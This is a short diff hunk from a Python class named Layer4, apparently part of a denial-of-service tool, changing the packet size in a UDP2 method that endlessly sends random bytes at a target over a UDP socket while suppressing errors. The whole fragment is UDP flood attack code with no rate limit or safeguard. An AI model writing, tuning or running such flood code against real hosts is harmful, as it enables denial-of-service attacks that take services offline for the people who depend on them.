@@ -475,7 +475,7 @@ class Layer4(Thread):
     def UDP2(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(32517), self._target):
+            while Tools.sendto(s, randbytes(15360), self._target):
                 continue
         Tools.safe_close(s)
 
